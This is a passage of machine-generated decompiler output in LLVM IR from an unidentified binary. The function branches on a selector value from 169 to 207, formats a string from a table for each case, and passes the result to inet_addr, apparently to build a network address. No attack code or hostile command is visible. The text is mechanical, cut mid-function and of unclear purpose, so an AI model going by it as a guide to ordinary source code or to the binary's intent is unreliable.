  %v4_10006ae4 = call i32 @szprintf(i32 %v2_10006aa0, i32 ptrtoint ([15 x i8]* @global_var_10015a54.212 to i32), i32 %v4_10006ab4)
  br label %dec_label_pc_10006ae8

dec_label_pc_10006ae8:                            ; preds = %dec_label_pc_10006a94, %dec_label_pc_10006aa0
  %v3_10006aec = icmp eq i32 %v2_10003364, 169
  br i1 %v3_10006aec, label %dec_label_pc_10006af4, label %dec_label_pc_10006b3c

dec_label_pc_10006af4:                            ; preds = %dec_label_pc_10006ae8
  %v2_10006af4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006b08 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006b08 = zext i8 %v3_10006b08 to i32
  %v4_10006b38 = call i32 @szprintf(i32 %v2_10006af4, i32 ptrtoint ([14 x i8]* @global_var_10015a64.213 to i32), i32 %v4_10006b08)
  br label %dec_label_pc_10006b3c

dec_label_pc_10006b3c:                            ; preds = %dec_label_pc_10006ae8, %dec_label_pc_10006af4
  %v3_10006b40 = icmp eq i32 %v2_10003364, 171
  br i1 %v3_10006b40, label %dec_label_pc_10006b48, label %dec_label_pc_10006b90

dec_label_pc_10006b48:                            ; preds = %dec_label_pc_10006b3c
  %v2_10006b48 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006b5c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006b5c = zext i8 %v3_10006b5c to i32
  %v4_10006b8c = call i32 @szprintf(i32 %v2_10006b48, i32 ptrtoint ([14 x i8]* @global_var_10015a74.214 to i32), i32 %v4_10006b5c)
  br label %dec_label_pc_10006b90

dec_label_pc_10006b90:                            ; preds = %dec_label_pc_10006b3c, %dec_label_pc_10006b48
  %v3_10006b94 = icmp eq i32 %v2_10003364, 172
  br i1 %v3_10006b94, label %dec_label_pc_10006b9c, label %dec_label_pc_10006be4

dec_label_pc_10006b9c:                            ; preds = %dec_label_pc_10006b90
  %v2_10006b9c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006bb0 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006bb0 = zext i8 %v3_10006bb0 to i32
  %v4_10006be0 = call i32 @szprintf(i32 %v2_10006b9c, i32 ptrtoint ([14 x i8]* @global_var_10015a84.215 to i32), i32 %v4_10006bb0)
  br label %dec_label_pc_10006be4

dec_label_pc_10006be4:                            ; preds = %dec_label_pc_10006b90, %dec_label_pc_10006b9c
  %v3_10006be8 = icmp eq i32 %v2_10003364, 173
  br i1 %v3_10006be8, label %dec_label_pc_10006bf0, label %dec_label_pc_10006c38

dec_label_pc_10006bf0:                            ; preds = %dec_label_pc_10006be4
  %v2_10006bf0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006c04 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006c04 = zext i8 %v3_10006c04 to i32
  %v4_10006c34 = call i32 @szprintf(i32 %v2_10006bf0, i32 ptrtoint ([14 x i8]* @global_var_10015a94.216 to i32), i32 %v4_10006c04)
  br label %dec_label_pc_10006c38

dec_label_pc_10006c38:                            ; preds = %dec_label_pc_10006be4, %dec_label_pc_10006bf0
  %v3_10006c3c = icmp eq i32 %v2_10003364, 174
  br i1 %v3_10006c3c, label %dec_label_pc_10006c44, label %dec_label_pc_10006c8c

dec_label_pc_10006c44:                            ; preds = %dec_label_pc_10006c38
  %v2_10006c44 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006c58 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006c58 = zext i8 %v3_10006c58 to i32
  %v4_10006c88 = call i32 @szprintf(i32 %v2_10006c44, i32 ptrtoint ([13 x i8]* @global_var_10015aa4.217 to i32), i32 %v4_10006c58)
  br label %dec_label_pc_10006c8c

dec_label_pc_10006c8c:                            ; preds = %dec_label_pc_10006c38, %dec_label_pc_10006c44
  %v3_10006c90 = icmp eq i32 %v2_10003364, 175
  br i1 %v3_10006c90, label %dec_label_pc_10006c98, label %dec_label_pc_10006ce0

dec_label_pc_10006c98:                            ; preds = %dec_label_pc_10006c8c
  %v2_10006c98 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006cac = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006cac = zext i8 %v3_10006cac to i32
  %v4_10006cdc = call i32 @szprintf(i32 %v2_10006c98, i32 ptrtoint ([14 x i8]* @global_var_10015ab4.218 to i32), i32 %v4_10006cac)
  br label %dec_label_pc_10006ce0

dec_label_pc_10006ce0:                            ; preds = %dec_label_pc_10006c8c, %dec_label_pc_10006c98
  %v3_10006ce4 = icmp eq i32 %v2_10003364, 176
  br i1 %v3_10006ce4, label %dec_label_pc_10006cec, label %dec_label_pc_10006d34

dec_label_pc_10006cec:                            ; preds = %dec_label_pc_10006ce0
  %v2_10006cec = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006d00 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006d00 = zext i8 %v3_10006d00 to i32
  %v4_10006d30 = call i32 @szprintf(i32 %v2_10006cec, i32 ptrtoint ([14 x i8]* @global_var_10015ac4.219 to i32), i32 %v4_10006d00)
  br label %dec_label_pc_10006d34

dec_label_pc_10006d34:                            ; preds = %dec_label_pc_10006ce0, %dec_label_pc_10006cec
  %v3_10006d38 = icmp eq i32 %v2_10003364, 177
  br i1 %v3_10006d38, label %dec_label_pc_10006d40, label %dec_label_pc_10006d88

dec_label_pc_10006d40:                            ; preds = %dec_label_pc_10006d34
  %v2_10006d40 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006d54 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006d54 = zext i8 %v3_10006d54 to i32
  %v4_10006d84 = call i32 @szprintf(i32 %v2_10006d40, i32 ptrtoint ([14 x i8]* @global_var_10015ad4.220 to i32), i32 %v4_10006d54)
  br label %dec_label_pc_10006d88

dec_label_pc_10006d88:                            ; preds = %dec_label_pc_10006d34, %dec_label_pc_10006d40
  %v3_10006d8c = icmp eq i32 %v2_10003364, 178
  br i1 %v3_10006d8c, label %dec_label_pc_10006d94, label %dec_label_pc_10006ddc

dec_label_pc_10006d94:                            ; preds = %dec_label_pc_10006d88
  %v2_10006d94 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006da8 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006da8 = zext i8 %v3_10006da8 to i32
  %v4_10006dd8 = call i32 @szprintf(i32 %v2_10006d94, i32 ptrtoint ([13 x i8]* @global_var_10015ae4.221 to i32), i32 %v4_10006da8)
  br label %dec_label_pc_10006ddc

dec_label_pc_10006ddc:                            ; preds = %dec_label_pc_10006d88, %dec_label_pc_10006d94
  %v3_10006de0 = icmp eq i32 %v2_10003364, 179
  br i1 %v3_10006de0, label %dec_label_pc_10006de8, label %dec_label_pc_10006e30

dec_label_pc_10006de8:                            ; preds = %dec_label_pc_10006ddc
  %v2_10006de8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006dfc = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006dfc = zext i8 %v3_10006dfc to i32
  %v4_10006e2c = call i32 @szprintf(i32 %v2_10006de8, i32 ptrtoint ([13 x i8]* @global_var_10015af4.222 to i32), i32 %v4_10006dfc)
  br label %dec_label_pc_10006e30

dec_label_pc_10006e30:                            ; preds = %dec_label_pc_10006ddc, %dec_label_pc_10006de8
  %v3_10006e34 = icmp eq i32 %v2_10003364, 180
  br i1 %v3_10006e34, label %dec_label_pc_10006e3c, label %dec_label_pc_10006e84

dec_label_pc_10006e3c:                            ; preds = %dec_label_pc_10006e30
  %v2_10006e3c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006e50 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006e50 = zext i8 %v3_10006e50 to i32
  %v4_10006e80 = call i32 @szprintf(i32 %v2_10006e3c, i32 ptrtoint ([13 x i8]* @global_var_10015b04.223 to i32), i32 %v4_10006e50)
  br label %dec_label_pc_10006e84

dec_label_pc_10006e84:                            ; preds = %dec_label_pc_10006e30, %dec_label_pc_10006e3c
  %v3_10006e88 = icmp eq i32 %v2_10003364, 181
  br i1 %v3_10006e88, label %dec_label_pc_10006e90, label %dec_label_pc_10006ed8

dec_label_pc_10006e90:                            ; preds = %dec_label_pc_10006e84
  %v2_10006e90 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006ea4 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006ea4 = zext i8 %v3_10006ea4 to i32
  %v4_10006ed4 = call i32 @szprintf(i32 %v2_10006e90, i32 ptrtoint ([13 x i8]* @global_var_10015b14.224 to i32), i32 %v4_10006ea4)
  br label %dec_label_pc_10006ed8

dec_label_pc_10006ed8:                            ; preds = %dec_label_pc_10006e84, %dec_label_pc_10006e90
  %v3_10006edc = icmp eq i32 %v2_10003364, 182
  br i1 %v3_10006edc, label %dec_label_pc_10006ee4, label %dec_label_pc_10006f2c

dec_label_pc_10006ee4:                            ; preds = %dec_label_pc_10006ed8
  %v2_10006ee4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006ef8 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006ef8 = zext i8 %v3_10006ef8 to i32
  %v4_10006f28 = call i32 @szprintf(i32 %v2_10006ee4, i32 ptrtoint ([13 x i8]* @global_var_10015b24.225 to i32), i32 %v4_10006ef8)
  br label %dec_label_pc_10006f2c

dec_label_pc_10006f2c:                            ; preds = %dec_label_pc_10006ed8, %dec_label_pc_10006ee4
  %v3_10006f30 = icmp eq i32 %v2_10003364, 183
  br i1 %v3_10006f30, label %dec_label_pc_10006f38, label %dec_label_pc_10006f80

dec_label_pc_10006f38:                            ; preds = %dec_label_pc_10006f2c
  %v2_10006f38 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006f4c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006f4c = zext i8 %v3_10006f4c to i32
  %v4_10006f7c = call i32 @szprintf(i32 %v2_10006f38, i32 ptrtoint ([13 x i8]* @global_var_10015340.98 to i32), i32 %v4_10006f4c)
  br label %dec_label_pc_10006f80

dec_label_pc_10006f80:                            ; preds = %dec_label_pc_10006f2c, %dec_label_pc_10006f38
  %v3_10006f84 = icmp eq i32 %v2_10003364, 184
  br i1 %v3_10006f84, label %dec_label_pc_10006f8c, label %dec_label_pc_10006fd4

dec_label_pc_10006f8c:                            ; preds = %dec_label_pc_10006f80
  %v2_10006f8c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006fa0 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006fa0 = zext i8 %v3_10006fa0 to i32
  %v4_10006fd0 = call i32 @szprintf(i32 %v2_10006f8c, i32 ptrtoint ([13 x i8]* @global_var_10015b34.226 to i32), i32 %v4_10006fa0)
  br label %dec_label_pc_10006fd4

dec_label_pc_10006fd4:                            ; preds = %dec_label_pc_10006f80, %dec_label_pc_10006f8c
  %v3_10006fd8 = icmp eq i32 %v2_10003364, 185
  br i1 %v3_10006fd8, label %dec_label_pc_10006fe0, label %dec_label_pc_10007028

dec_label_pc_10006fe0:                            ; preds = %dec_label_pc_10006fd4
  %v2_10006fe0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10006ff4 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10006ff4 = zext i8 %v3_10006ff4 to i32
  %v4_10007024 = call i32 @szprintf(i32 %v2_10006fe0, i32 ptrtoint ([13 x i8]* @global_var_10015b44.227 to i32), i32 %v4_10006ff4)
  br label %dec_label_pc_10007028

dec_label_pc_10007028:                            ; preds = %dec_label_pc_10006fd4, %dec_label_pc_10006fe0
  %v3_1000702c = icmp eq i32 %v2_10003364, 186
  br i1 %v3_1000702c, label %dec_label_pc_10007034, label %dec_label_pc_1000707c

dec_label_pc_10007034:                            ; preds = %dec_label_pc_10007028
  %v2_10007034 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007048 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10007048 = zext i8 %v3_10007048 to i32
  %v4_10007078 = call i32 @szprintf(i32 %v2_10007034, i32 ptrtoint ([14 x i8]* @global_var_10015b54.228 to i32), i32 %v4_10007048)
  br label %dec_label_pc_1000707c

dec_label_pc_1000707c:                            ; preds = %dec_label_pc_10007028, %dec_label_pc_10007034
  %v3_10007080 = icmp eq i32 %v2_10003364, 187
  br i1 %v3_10007080, label %dec_label_pc_10007088, label %dec_label_pc_100070d0

dec_label_pc_10007088:                            ; preds = %dec_label_pc_1000707c
  %v2_10007088 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000709c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_1000709c = zext i8 %v3_1000709c to i32
  %v4_100070cc = call i32 @szprintf(i32 %v2_10007088, i32 ptrtoint ([14 x i8]* @global_var_10015b64.229 to i32), i32 %v4_1000709c)
  br label %dec_label_pc_100070d0

dec_label_pc_100070d0:                            ; preds = %dec_label_pc_1000707c, %dec_label_pc_10007088
  %v3_100070d4 = icmp eq i32 %v2_10003364, 188
  br i1 %v3_100070d4, label %dec_label_pc_100070dc, label %dec_label_pc_10007124

dec_label_pc_100070dc:                            ; preds = %dec_label_pc_100070d0
  %v2_100070dc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100070f0 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100070f0 = zext i8 %v3_100070f0 to i32
  %v4_10007120 = call i32 @szprintf(i32 %v2_100070dc, i32 ptrtoint ([14 x i8]* @global_var_10015b64.229 to i32), i32 %v4_100070f0)
  br label %dec_label_pc_10007124

dec_label_pc_10007124:                            ; preds = %dec_label_pc_100070d0, %dec_label_pc_100070dc
  %v3_10007128 = icmp eq i32 %v2_10003364, 189
  br i1 %v3_10007128, label %dec_label_pc_10007130, label %dec_label_pc_10007178

dec_label_pc_10007130:                            ; preds = %dec_label_pc_10007124
  %v2_10007130 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007144 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10007144 = zext i8 %v3_10007144 to i32
  %v4_10007174 = call i32 @szprintf(i32 %v2_10007130, i32 ptrtoint ([14 x i8]* @global_var_10015b74.230 to i32), i32 %v4_10007144)
  br label %dec_label_pc_10007178

dec_label_pc_10007178:                            ; preds = %dec_label_pc_10007124, %dec_label_pc_10007130
  %v3_1000717c = icmp eq i32 %v2_10003364, 190
  br i1 %v3_1000717c, label %dec_label_pc_10007184, label %dec_label_pc_100071cc

dec_label_pc_10007184:                            ; preds = %dec_label_pc_10007178
  %v2_10007184 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007198 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10007198 = zext i8 %v3_10007198 to i32
  %v4_100071c8 = call i32 @szprintf(i32 %v2_10007184, i32 ptrtoint ([14 x i8]* @global_var_10015b84.231 to i32), i32 %v4_10007198)
  br label %dec_label_pc_100071cc

dec_label_pc_100071cc:                            ; preds = %dec_label_pc_10007178, %dec_label_pc_10007184
  %v3_100071d0 = icmp eq i32 %v2_10003364, 191
  br i1 %v3_100071d0, label %dec_label_pc_100071d8, label %dec_label_pc_10007220

dec_label_pc_100071d8:                            ; preds = %dec_label_pc_100071cc
  %v2_100071d8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100071ec = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100071ec = zext i8 %v3_100071ec to i32
  %v4_1000721c = call i32 @szprintf(i32 %v2_100071d8, i32 ptrtoint ([14 x i8]* @global_var_10015b94.232 to i32), i32 %v4_100071ec)
  br label %dec_label_pc_10007220

dec_label_pc_10007220:                            ; preds = %dec_label_pc_100071cc, %dec_label_pc_100071d8
  %v3_10007224 = icmp eq i32 %v2_10003364, 192
  br i1 %v3_10007224, label %dec_label_pc_1000722c, label %dec_label_pc_10007274

dec_label_pc_1000722c:                            ; preds = %dec_label_pc_10007220
  %v2_1000722c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007240 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10007240 = zext i8 %v3_10007240 to i32
  %v4_10007270 = call i32 @szprintf(i32 %v2_1000722c, i32 ptrtoint ([13 x i8]* @global_var_10015ba4.233 to i32), i32 %v4_10007240)
  br label %dec_label_pc_10007274

dec_label_pc_10007274:                            ; preds = %dec_label_pc_10007220, %dec_label_pc_1000722c
  %v3_10007278 = icmp eq i32 %v2_10003364, 193
  br i1 %v3_10007278, label %dec_label_pc_10007280, label %dec_label_pc_100072c8

dec_label_pc_10007280:                            ; preds = %dec_label_pc_10007274
  %v2_10007280 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007294 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10007294 = zext i8 %v3_10007294 to i32
  %v4_100072c4 = call i32 @szprintf(i32 %v2_10007280, i32 ptrtoint ([13 x i8]* @global_var_10015bb4.234 to i32), i32 %v4_10007294)
  br label %dec_label_pc_100072c8

dec_label_pc_100072c8:                            ; preds = %dec_label_pc_10007274, %dec_label_pc_10007280
  %v3_100072cc = icmp eq i32 %v2_10003364, 194
  br i1 %v3_100072cc, label %dec_label_pc_100072d4, label %dec_label_pc_1000731c

dec_label_pc_100072d4:                            ; preds = %dec_label_pc_100072c8
  %v2_100072d4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100072e8 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100072e8 = zext i8 %v3_100072e8 to i32
  %v4_10007318 = call i32 @szprintf(i32 %v2_100072d4, i32 ptrtoint ([14 x i8]* @global_var_10015bc4.235 to i32), i32 %v4_100072e8)
  br label %dec_label_pc_1000731c

dec_label_pc_1000731c:                            ; preds = %dec_label_pc_100072c8, %dec_label_pc_100072d4
  %v3_10007320 = icmp eq i32 %v2_10003364, 195
  br i1 %v3_10007320, label %dec_label_pc_10007328, label %dec_label_pc_10007370

dec_label_pc_10007328:                            ; preds = %dec_label_pc_1000731c
  %v2_10007328 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000733c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_1000733c = zext i8 %v3_1000733c to i32
  %v4_1000736c = call i32 @szprintf(i32 %v2_10007328, i32 ptrtoint ([17 x i8]* @global_var_10015bd4.236 to i32), i32 %v4_1000733c)
  br label %dec_label_pc_10007370

dec_label_pc_10007370:                            ; preds = %dec_label_pc_1000731c, %dec_label_pc_10007328
  %v3_10007374 = icmp eq i32 %v2_10003364, 196
  br i1 %v3_10007374, label %dec_label_pc_1000737c, label %dec_label_pc_100073c4

dec_label_pc_1000737c:                            ; preds = %dec_label_pc_10007370
  %v2_1000737c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007390 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10007390 = zext i8 %v3_10007390 to i32
  %v4_100073c0 = call i32 @szprintf(i32 %v2_1000737c, i32 ptrtoint ([16 x i8]* @global_var_10015be8.237 to i32), i32 %v4_10007390)
  br label %dec_label_pc_100073c4

dec_label_pc_100073c4:                            ; preds = %dec_label_pc_10007370, %dec_label_pc_1000737c
  %v3_100073c8 = icmp eq i32 %v2_10003364, 197
  br i1 %v3_100073c8, label %dec_label_pc_100073d0, label %dec_label_pc_10007418

dec_label_pc_100073d0:                            ; preds = %dec_label_pc_100073c4
  %v2_100073d0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100073e4 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100073e4 = zext i8 %v3_100073e4 to i32
  %v4_10007414 = call i32 @szprintf(i32 %v2_100073d0, i32 ptrtoint ([15 x i8]* @global_var_100157bc.170 to i32), i32 %v4_100073e4)
  br label %dec_label_pc_10007418

dec_label_pc_10007418:                            ; preds = %dec_label_pc_100073c4, %dec_label_pc_100073d0
  %v3_1000741c = icmp eq i32 %v2_10003364, 198
  br i1 %v3_1000741c, label %dec_label_pc_10007424, label %dec_label_pc_1000746c

dec_label_pc_10007424:                            ; preds = %dec_label_pc_10007418
  %v2_10007424 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007438 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10007438 = zext i8 %v3_10007438 to i32
  %v4_10007468 = call i32 @szprintf(i32 %v2_10007424, i32 ptrtoint ([15 x i8]* @global_var_10015bf8.238 to i32), i32 %v4_10007438)
  br label %dec_label_pc_1000746c

dec_label_pc_1000746c:                            ; preds = %dec_label_pc_10007418, %dec_label_pc_10007424
  %v3_10007470 = icmp eq i32 %v2_10003364, 199
  br i1 %v3_10007470, label %dec_label_pc_10007478, label %dec_label_pc_100074c0

dec_label_pc_10007478:                            ; preds = %dec_label_pc_1000746c
  %v2_10007478 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000748c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_1000748c = zext i8 %v3_1000748c to i32
  %v4_100074bc = call i32 @szprintf(i32 %v2_10007478, i32 ptrtoint ([15 x i8]* @global_var_10015c08.239 to i32), i32 %v4_1000748c)
  br label %dec_label_pc_100074c0

dec_label_pc_100074c0:                            ; preds = %dec_label_pc_1000746c, %dec_label_pc_10007478
  %v3_100074c4 = icmp eq i32 %v2_10003364, 200
  br i1 %v3_100074c4, label %dec_label_pc_100074cc, label %dec_label_pc_10007514

dec_label_pc_100074cc:                            ; preds = %dec_label_pc_100074c0
  %v2_100074cc = ptrtoint i32* %stack_var_-52 to i32
  %v3_100074e0 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100074e0 = zext i8 %v3_100074e0 to i32
  %v4_10007510 = call i32 @szprintf(i32 %v2_100074cc, i32 ptrtoint ([15 x i8]* @global_var_10015c18.240 to i32), i32 %v4_100074e0)
  br label %dec_label_pc_10007514

dec_label_pc_10007514:                            ; preds = %dec_label_pc_100074c0, %dec_label_pc_100074cc
  %v3_10007518 = icmp eq i32 %v2_10003364, 201
  br i1 %v3_10007518, label %dec_label_pc_10007574, label %dec_label_pc_10007568

dec_label_pc_10007568:                            ; preds = %dec_label_pc_10007514
  br label %dec_label_pc_100075bc

dec_label_pc_10007574:                            ; preds = %dec_label_pc_10007514
  %v2_10007520 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007534 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10007534 = zext i8 %v3_10007534 to i32
  %v4_10007564 = call i32 @szprintf(i32 %v2_10007520, i32 ptrtoint ([15 x i8]* @global_var_10015c28.241 to i32), i32 %v4_10007534)
  %v3_10007588 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10007588 = zext i8 %v3_10007588 to i32
  %v4_100075b8 = call i32 @szprintf(i32 %v2_10007520, i32 ptrtoint ([13 x i8]* @global_var_10015c38.242 to i32), i32 %v4_10007588)
  br label %dec_label_pc_100075bc

dec_label_pc_100075bc:                            ; preds = %dec_label_pc_10007568, %dec_label_pc_10007574
  %v3_100075c0 = icmp eq i32 %v2_10003364, 202
  br i1 %v3_100075c0, label %dec_label_pc_100075c8, label %dec_label_pc_10007610

dec_label_pc_100075c8:                            ; preds = %dec_label_pc_100075bc
  %v2_100075c8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100075dc = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100075dc = zext i8 %v3_100075dc to i32
  %v4_1000760c = call i32 @szprintf(i32 %v2_100075c8, i32 ptrtoint ([14 x i8]* @global_var_10015270.83 to i32), i32 %v4_100075dc)
  br label %dec_label_pc_10007610

dec_label_pc_10007610:                            ; preds = %dec_label_pc_100075bc, %dec_label_pc_100075c8
  %v3_10007614 = icmp eq i32 %v2_10003364, 203
  br i1 %v3_10007614, label %dec_label_pc_1000761c, label %dec_label_pc_10007664

dec_label_pc_1000761c:                            ; preds = %dec_label_pc_10007610
  %v2_1000761c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007630 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10007630 = zext i8 %v3_10007630 to i32
  %v4_10007660 = call i32 @szprintf(i32 %v2_1000761c, i32 ptrtoint ([13 x i8]* @global_var_10015c48.243 to i32), i32 %v4_10007630)
  br label %dec_label_pc_10007664

dec_label_pc_10007664:                            ; preds = %dec_label_pc_10007610, %dec_label_pc_1000761c
  %v3_10007668 = icmp eq i32 %v2_10003364, 204
  br i1 %v3_10007668, label %dec_label_pc_10007670, label %dec_label_pc_100076b8

dec_label_pc_10007670:                            ; preds = %dec_label_pc_10007664
  %v2_10007670 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10007684 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10007684 = zext i8 %v3_10007684 to i32
  %v4_100076b4 = call i32 @szprintf(i32 %v2_10007670, i32 ptrtoint ([13 x i8]* @global_var_10015c58.244 to i32), i32 %v4_10007684)
  br label %dec_label_pc_100076b8

dec_label_pc_100076b8:                            ; preds = %dec_label_pc_10007664, %dec_label_pc_10007670
  %v3_100076bc = icmp eq i32 %v2_10003364, 205
  br i1 %v3_100076bc, label %dec_label_pc_100076c4, label %dec_label_pc_1000770c

dec_label_pc_100076c4:                            ; preds = %dec_label_pc_100076b8
  %v2_100076c4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100076d8 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_100076d8 = zext i8 %v3_100076d8 to i32
  %v4_10007708 = call i32 @szprintf(i32 %v2_100076c4, i32 ptrtoint ([13 x i8]* @global_var_10015c68.245 to i32), i32 %v4_100076d8)
  br label %dec_label_pc_1000770c

dec_label_pc_1000770c:                            ; preds = %dec_label_pc_100076b8, %dec_label_pc_100076c4
  %v3_10007710 = icmp eq i32 %v2_10003364, 206
  br i1 %v3_10007710, label %dec_label_pc_10007718, label %dec_label_pc_10007760

dec_label_pc_10007718:                            ; preds = %dec_label_pc_1000770c
  %v2_10007718 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000772c = load i8, i8* @global_var_100285cb.54, align 1
  %v4_1000772c = zext i8 %v3_1000772c to i32
  %v4_1000775c = call i32 @szprintf(i32 %v2_10007718, i32 ptrtoint ([13 x i8]* @global_var_10015c78.246 to i32), i32 %v4_1000772c)
  br label %dec_label_pc_10007760

dec_label_pc_10007760:                            ; preds = %dec_label_pc_1000770c, %dec_label_pc_10007718
  %v3_10007764 = icmp eq i32 %v2_10003364, 207
  %v2_1000776c = ptrtoint i32* %stack_var_-52 to i32
  br i1 %v3_10007764, label %dec_label_pc_1000776c, label %dec_label_pc_100077b4

dec_label_pc_1000776c:                            ; preds = %dec_label_pc_10007760
  %v3_10007780 = load i8, i8* @global_var_100285cb.54, align 1
  %v4_10007780 = zext i8 %v3_10007780 to i32
  %v4_100077b0 = call i32 @szprintf(i32 %v2_1000776c, i32 ptrtoint ([14 x i8]* @global_var_10015c88.247 to i32), i32 %v4_10007780)
  br label %dec_label_pc_100077b4

dec_label_pc_100077b4:                            ; preds = %dec_label_pc_10007760, %dec_label_pc_1000776c
  br i1 false, label %dec_label_pc_100077c0, label %dec_label_pc_10007808

dec_label_pc_100077c0:                            ; preds = %dec_label_pc_100077b4
  br label %dec_label_pc_10007808

dec_label_pc_10007808:                            ; preds = %dec_label_pc_100077b4, %dec_label_pc_100077c0
  store i32 268466196, i32* @lr, align 4
  %v1_10007810 = call i32 @inet_addr(i32 %v2_1000776c)
  ret i32 %v1_10007810

; uselistorder directives
  uselistorder i8* @global_var_100285cc.55, { 1, 0 }
  uselistorder i8* @global_var_100285cb.54, { 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10007808, { 1, 0 }
  uselistorder label %dec_label_pc_100077b4, { 1, 0 }
  uselistorder label %dec_label_pc_10007760, { 1, 0 }
  uselistorder label %dec_label_pc_1000770c, { 1, 0 }
  uselistorder label %dec_label_pc_100076b8, { 1, 0 }
  uselistorder label %dec_label_pc_10007664, { 1, 0 }
  uselistorder label %dec_label_pc_10007610, { 1, 0 }
  uselistorder label %dec_label_pc_100075bc, { 1, 0 }
  uselistorder label %dec_label_pc_10007514, { 1, 0 }
  uselistorder label %dec_label_pc_100074c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000746c, { 1, 0 }
  uselistorder label %dec_label_pc_10007418, { 1, 0 }
  uselistorder label %dec_label_pc_100073c4, { 1, 0 }
  uselistorder label %dec_label_pc_10007370, { 1, 0 }
  uselistorder label %dec_label_pc_1000731c, { 1, 0 }
  uselistorder label %dec_label_pc_100072c8, { 1, 0 }
  uselistorder label %dec_label_pc_10007274, { 1, 0 }
  uselistorder label %dec_label_pc_10007220, { 1, 0 }
  uselistorder label %dec_label_pc_100071cc, { 1, 0 }
  uselistorder label %dec_label_pc_10007178, { 1, 0 }
  uselistorder label %dec_label_pc_10007124, { 1, 0 }
